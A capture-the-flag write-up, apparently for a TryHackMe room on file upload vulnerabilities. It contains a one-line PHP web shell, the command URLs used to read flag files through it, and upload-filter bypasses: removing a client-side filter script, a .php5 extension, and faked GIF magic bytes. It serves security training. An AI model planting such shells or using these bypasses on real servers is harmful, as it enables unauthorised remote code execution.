# Upload Vulnerabilities

- Configure your hosts file for the task, as per the instructions above.

	  no answer needed

- Read and understand the above information.

	  no answer needed

- Read the General Methodology

	  no answer needed

- What is the name of the image file which can be overwritten?

	- Look at the source code, something like `images/***********`
	- `********.***`

- Overwrite the image. What is the flag you receive?

	- `*************************************`

- Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?

	- No
	- `scilla dir -target shell.uploadvulns.thm`
	- `/*********`

- Get either a web shell or a reverse shell on the machine.
What's the flag in the /var/www/ directory of the server?

	- Create a fie called `ws.php`
	- Paste this inside
	~~~
	<?php
    		echo system($_GET["cmd"]);
	?>
	~~~
	- Upload the file.
	- Navigate to `http://shell.uploadvulns.thm/resources/`
	- Click on ws.php.
	- `http://shell.uploadvulns.thm/resources/ws.php?cmd=ls`
	- `http://shell.uploadvulns.thm/resources/ws.php?cmd=pwd`
	- `http://shell.uploadvulns.thm/resources/ws.php?cmd=ls%20../../`
	- `http://shell.uploadvulns.thm/resources/ws.php?cmd=cat%20../../flag.txt`
	- `********************************************`

- What is the traditional server-side scripting language?

	- `php`

- When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?

	- `whitelist`

- [Research] What MIME type would you expect to see when uploading a CSV file?

	- `****/csv`

- What is the flag in /var/www/?

	- `scilla dir -target http://java.uploadvulns.thm/`
	- `images` is the interesting directory.
	- Visit http://java.uploadvulns.thm with BurpSuite enabled.
	- Intercept response (remember to disable js filtering on options sub-tab).
	- Delete this line:
	~~~
	<script src="assets/js/client-side-filter.js"></script>
	~~~
	- Upload `ws.php`.
	- Navigate to `/images`.
	- Click on ws.php.
	- `http://java.uploadvulns.thm/images/ws.php?cmd=ls`
	- `http://java.uploadvulns.thm/images/ws.php?cmd=pwd`
	- `http://java.uploadvulns.thm/images/ws.php?cmd=ls%20../../`
	- `http://java.uploadvulns.thm/images/ws.php?cmd=cat%20../../flag.txt`
	- `********************************************`

- What is the flag in /var/www/?

	- Upload a `jpg` file and see if this is accepted. OK, accepted.
	- Rename `ws.php` to `ws.php5`.
	- Upload that.
	- `scilla dir -target annex.uploadvulns.thm`
	- `/privacy` found.
	- Click on ws.php5.
	- `http://annex.uploadvulns.thm/privacy/ws.php5?cmd=ls`
	- `http://annex.uploadvulns.thm/privacy/ws.php5?cmd=pwd`
	- `http://annex.uploadvulns.thm/privacy/ws.php5?cmd=ls%20../../`
	- `http://annex.uploadvulns.thm/privacy/ws.php5?cmd=cat%20../../flag.txt`
	- `********************************************`

- Grab the flag from /var/www/

	- `file ws.php`
	- `hexeditor ws.php`
	- Change the first bytes with `47 49 46 38 37 61`.(GIF87a)
	- Upload on http://magic.uploadvulns.thm
	- As done before....
	- `**********************************************`

- Read the example methodology

	  no answer needed

- 

	- I had some problems with this :(
	- I suggest you to see this video, It's perfect. https://www.youtube.com/watch?v=5uGWFWvpJUg




